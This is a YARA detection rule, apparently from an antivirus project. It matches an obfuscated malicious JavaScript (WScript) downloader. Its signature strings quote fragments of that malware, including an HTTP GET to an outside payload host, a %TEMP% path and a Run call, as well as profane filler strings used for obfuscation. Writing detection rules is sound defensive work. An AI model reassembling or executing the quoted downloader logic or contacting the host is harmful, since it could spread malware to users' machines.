rule sig_20160428_6098f3212cef96510fdce15c9f1a360b {
  meta:
    description = "datamaliciousorder - file 20160428_6098f3212cef96510fdce15c9f1a360b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f5167944449f884fccd07712ec6c73e83e7926dad4fa73f404276a119ee136be"

  strings:
    $s1  = "function ZjwHaaJgaIfaYlzWjiMps() {return PohOymQdnSxnRgvAqoVwa[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "function DbbAlcKjfHtlBzwVorZfc(LynNrsIcbYmtCexZixQro){PohOymQdnSxnRgvAqoVwa[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function DbbAlcKjfHtlBzwVorZfc(LynNrsIcbYmtCexZixQro){PohOymQdnSxnRgvAqoVwa[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "return UgdKxbGkoTduYlxUyqSsh - FktIwpYbqFnoUyfKamTbg;};" fullword ascii
    $s5  = "function SagUqrTmsRriYrsRtgGfx(UgdKxbGkoTduYlxUyqSsh, FktIwpYbqFnoUyfKamTbg){RqgBxfJmbLxwMuoXicXqv = RqgBxfJmbLxwMuoXicXqv * 1; " ascii
    $s6  = "var PohOymQdnSxnRgvAqoVwa = function OslSbeZfbGrzLjqQviZfv() {return XidMfrEraUirOgdMrjZtn[VjjIdeFoaZxuSvpUloNrr](\"WScript\"+\"" ascii
    $s7  = "var PohOymQdnSxnRgvAqoVwa = function OslSbeZfbGrzLjqQviZfv() {return XidMfrEraUirOgdMrjZtn[VjjIdeFoaZxuSvpUloNrr](\"WScript\"+\"" ascii
    $s8  = "var XidMfrEraUirOgdMrjZtn = this[\"WScript\"];" fullword ascii
    $s9  = "function ZjwHaaJgaIfaYlzWjiMps() {return PohOymQdnSxnRgvAqoVwa[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s10 = "function UfqRkuAopXsvHbeAfgThq(){return OzsDpoIeoRjtUqcFenUiy + \"\";};" fullword ascii
    $s11 = "function SagUqrTmsRriYrsRtgGfx(UgdKxbGkoTduYlxUyqSsh, FktIwpYbqFnoUyfKamTbg){RqgBxfJmbLxwMuoXicXqv = RqgBxfJmbLxwMuoXicXqv * 1; " ascii
    $s12 = "if (YhgVvoEaeDytEfuHpoNdj[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function AytRfkGmrJpnIznVrmUfs() {return ((UoqQmwXxhCykHrqZjoOzm == true) && (UoqQmwXxhCykHrqZjoOzm == DfmMokXqyUgfAbyHknJlt)) ?" ascii
    $s14 = "YhgVvoEaeDytEfuHpoNdj[JbbXyrFgmJsbCaeUltIlw](\"G\" + \"ET\", \"http://dotatest.ru/zowjsk\", false);" fullword ascii
    $s15 = "function AytRfkGmrJpnIznVrmUfs() {return ((UoqQmwXxhCykHrqZjoOzm == true) && (UoqQmwXxhCykHrqZjoOzm == DfmMokXqyUgfAbyHknJlt)) ?" ascii
    $s16 = "UoqQmwXxhCykHrqZjoOzm = true; " fullword ascii
    $s17 = "function BfgItbBocCgwAscOlpDad()" fullword ascii
    $s18 = "WmnWkdRsoLmvKinKldUsz = true;" fullword ascii
    $s19 = "var UoqQmwXxhCykHrqZjoOzm = false;" fullword ascii
    $s20 = "var AtjCnqIemZgiTrjCsoNbo = new this[\"D\"+\"ate\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}